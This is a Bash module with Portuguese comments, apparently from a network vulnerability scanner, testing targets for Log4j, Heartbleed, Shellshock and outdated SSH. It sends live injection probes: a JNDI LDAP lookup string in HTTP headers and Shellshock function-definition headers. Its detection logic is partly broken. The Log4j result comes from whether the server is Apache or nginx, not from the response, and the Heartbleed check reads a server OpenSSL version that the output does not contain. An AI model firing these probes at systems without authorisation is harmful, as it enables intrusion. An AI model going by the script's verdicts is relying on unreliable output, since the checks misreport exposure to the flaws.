#!/bin/bash
# vuln_tests.sh - Testes de vulnerabilidades conhecidas (Log4j, Heartbleed, Shellshock, SSH)

test_log4j() {
    local ip=$1
    local dominio=$2
    local pasta=$3

    LOG4J_VULN="Nao testado"

    if [ -z "$dominio" ] || [ "$dominio" = "N/A" ]; then
        LOG4J_VULN="N/A (dominio necessario)"
        return
    fi

    local proto="https"
    if ! grep -q "443/tcp.*ABERTA" "${pasta}/portas.txt" 2>/dev/null; then
        proto="http"
        if ! grep -q "80/tcp.*ABERTA" "${pasta}/portas.txt" 2>/dev/null; then
            LOG4J_VULN="N/A (sem HTTP/HTTPS)"
            return
        fi
    fi

    log_info "Testando Log4j (CVE-2021-44228)..."
    local test_header='${jndi:ldap://log4j-test.'${dominio}'/a}'
    local response
    response=$(curl -sk --max-time 5 "${proto}://${dominio}" \
        -H "User-Agent: ${test_header}" \
        -H "X-Api-Version: ${test_header}" \
        -w "%{http_code}" -o /dev/null 2>/dev/null)

    local server_ver="${SERVER_INFO:-}"
    if echo "$server_ver" | grep -qi "apache"; then
        if echo "$server_ver" | grep -qiE "2\.[0-9]+\.|1\.[0-9]+\."; then
            LOG4J_VULN="ALERTA - Apache antigo, potencialmente vulneravel"
        else
            LOG4J_VULN="Servidor Apache - recomenda-se verificar versao"
        fi
    elif echo "$server_ver" | grep -qi "nginx"; then
        LOG4J_VULN="Nginx - geralmente nao afetado"
    else
        LOG4J_VULN="Nao foi possivel determinar (servidor: ${server_ver:-desconhecido})"
    fi

    log_info "Teste Log4j: $LOG4J_VULN"
    export LOG4J_VULN
}

test_heartbleed() {
    local ip=$1
    local pasta=$2

    HEARTBLEED_VULN="Nao testado"

    if ! grep -q "443/tcp.*ABERTA\|8443/tcp.*ABERTA" "${pasta}/portas.txt" 2>/dev/null; then
        HEARTBLEED_VULN="N/A (sem HTTPS)"
        export HEARTBLEED_VULN
        return
    fi

    log_info "Testando Heartbleed (CVE-2014-0160)..."

    if command -v openssl &>/dev/null; then
        local cert_info
        cert_info=$(echo | timeout 5 openssl s_client -connect "${ip}:443" 2>/dev/null < /dev/null)
        if echo "$cert_info" | grep -qi "OpenSSL 1\.0\.[01]"; then
            HEARTBLEED_VULN="POTENCIALMENTE VULNERAVEL (OpenSSL 1.0.0/1.0.1)"
        elif echo "$cert_info" | grep -qi "OpenSSL"; then
            local openssl_ver=$(echo "$cert_info" | grep -oP 'OpenSSL \K[0-9.]+')
            HEARTBLEED_VULN="OpenSSL ${openssl_ver} - verificar versao"
        else
            HEARTBLEED_VULN="Nao detectado (OpenSSL versao segura ou outro SSL)"
        fi
    else
        HEARTBLEED_VULN="Nao foi possivel testar (sem openssl)"
    fi

    export HEARTBLEED_VULN
    log_info "Teste Heartbleed: $HEARTBLEED_VULN"
}

test_shellshock() {
    local ip=$1
    local dominio=$2
    local pasta=$3

    SHELLSHOCK_VULN="Nao testado"

    if [ -z "$dominio" ] || [ "$dominio" = "N/A" ]; then
        SHELLSHOCK_VULN="N/A (dominio necessario)"
        export SHELLSHOCK_VULN
        return
    fi

    local proto="https"
    if ! grep -q "443/tcp.*ABERTA" "${pasta}/portas.txt" 2>/dev/null; then
        proto="http"
        if ! grep -q "80/tcp.*ABERTA" "${pasta}/portas.txt" 2>/dev/null; then
            SHELLSHOCK_VULN="N/A (sem HTTP/HTTPS)"
            export SHELLSHOCK_VULN
            return
        fi
    fi

    log_info "Testando Shellshock (CVE-2014-6271)..."
    local test_output="${pasta}/shellshock_test.txt"
    curl -sk --max-time 5 "${proto}://${dominio}/cgi-bin/test.cgi" \
        -H "User-Agent: () { :;}; echo; echo; echo SHELLSHOCK_TEST" \
        -o "$test_output" 2>/dev/null

    if [ -f "$test_output" ] && grep -q "SHELLSHOCK_TEST" "$test_output" 2>/dev/null; then
        SHELLSHOCK_VULN="VULNERAVEL - CGI retornou payload"
    else
        local response_headers="${pasta}/shellshock_headers.txt"
        curl -sk -D "$response_headers" --max-time 5 "${proto}://${dominio}/" \
            -H "Referer: () { :;}; echo; echo SHELLSHOCK_HEADER" \
            -o /dev/null 2>/dev/null

        if [ -f "$response_headers" ] && grep -q "SHELLSHOCK_HEADER" "$response_headers" 2>/dev/null; then
            SHELLSHOCK_VULN="VULNERAVEL - Header refletido na resposta"
        else
            SHELLSHOCK_VULN="Nao detectado (sem CGI exposto ou servidor seguro)"
        fi
    fi

    export SHELLSHOCK_VULN
    log_info "Teste Shellshock: $SHELLSHOCK_VULN"
}

test_ssh_weak_ciphers() {
    local ip=$1
    local pasta=$2

    SSH_WEAK="Nao testado"

    if ! grep -q "22/tcp.*ABERTA" "${pasta}/portas.txt" 2>/dev/null; then
        SSH_WEAK="N/A (sem SSH)"
        export SSH_WEAK
        return
    fi

    log_info "Testando algoritmos SSH..."
    local banner="${SSH_BANNER:-}"

    if [ -n "$banner" ] && [ "$banner" != "N/A" ] && [ "$banner" != "Timeout" ]; then
        if echo "$banner" | grep -qiE "SSH-1\."; then
            SSH_WEAK="CRITICO - SSH versao 1 detectada (totalmente inseguro)"
        elif echo "$banner" | grep -qiE "SSH-2\.0-.*(dropbear_0\.[0-9]|libssh_0\.[0-7])"; then
            SSH_WEAK="VULNERAVEL - Versao antiga do servidor SSH"
        elif echo "$banner" | grep -qiE "SSH-2\.0-.*OpenSSH_[0-9]\."; then
            local ver=$(echo "$banner" | grep -oP 'OpenSSH_\K[0-9.]+')
            if [ -n "$ver" ]; then
                local major=$(echo "$ver" | cut -d. -f1)
                local minor=$(echo "$ver" | cut -d. -f2)
                if [ "$major" -lt 7 ] || { [ "$major" -eq 7 ] && [ "$minor" -lt 4 ]; }; then
                    SSH_WEAK="ALERTA - OpenSSH ${ver} antigo (anterior a 7.4)"
                else
                    SSH_WEAK="OpenSSH ${ver} - versao aparentemente OK"
                fi
            fi
        else
            SSH_WEAK="Banner: ${banner} - verificar manualmente"
        fi
    else
        SSH_WEAK="Nao foi possivel obter banner SSH"
    fi

    export SSH_WEAK
    log_info "Teste SSH: $SSH_WEAK"
}

run_vuln_tests() {
    local ip=$1
    local dominio=$2
    local pasta=$3
    local vuln_file="${pasta}/vuln_tests.txt"

    log_info "Executando testes de vulnerabilidade..."

    {
        echo "=== TESTES DE VULNERABILIDADE ==="
        echo "IP: $ip"
        echo "Dominio: ${dominio:-N/A}"
        echo "Data: $(date)"
        echo "--------------------------------"
    } > "$vuln_file"

    test_log4j "$ip" "$dominio" "$pasta"
    echo -e "\n[Log4j CVE-2021-44228]" >> "$vuln_file"
    echo "Resultado: $LOG4J_VULN" >> "$vuln_file"

    test_heartbleed "$ip" "$pasta"
    echo -e "\n[Heartbleed CVE-2014-0160]" >> "$vuln_file"
    echo "Resultado: $HEARTBLEED_VULN" >> "$vuln_file"

    test_shellshock "$ip" "$dominio" "$pasta"
    echo -e "\n[Shellshock CVE-2014-6271]" >> "$vuln_file"
    echo "Resultado: $SHELLSHOCK_VULN" >> "$vuln_file"

    test_ssh_weak_ciphers "$ip" "$pasta"
    echo -e "\n[SSH Weak Ciphers]" >> "$vuln_file"
    echo "Resultado: $SSH_WEAK" >> "$vuln_file"

    export LOG4J_VULN HEARTBLEED_VULN SHELLSHOCK_VULN SSH_WEAK
    log_success "Testes de vulnerabilidade concluidos."
}
